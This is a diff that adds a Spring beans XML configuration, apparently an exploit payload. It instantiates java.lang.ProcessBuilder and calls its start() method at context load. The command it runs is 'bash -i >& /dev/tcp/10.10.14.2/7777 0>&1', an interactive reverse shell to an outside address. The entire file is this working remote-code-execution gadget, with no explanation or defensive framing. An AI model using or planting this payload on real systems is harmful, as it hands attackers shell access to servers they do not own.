@@ -1,0 +1,16 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<beans xmlns="http://www.springframework.org/schema/beans"
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+       xsi:schemaLocation="http://www.springframework.org/schema/beans
+       http://www.springframework.org/schema/beans/spring-beans.xsd">
+    <bean id="pb" class="java.lang.ProcessBuilder">
+        <constructor-arg>
+            <list>
+                <value>/bin/bash</value>
+                <value>-c</value>
+                <value><![CDATA[bash -i >& /dev/tcp/10.10.14.2/7777 0>&1]]></value>
+            </list>
+        </constructor-arg>
+    </bean>
+    <bean id="proc" factory-bean="pb" factory-method="start"/>
+</beans>
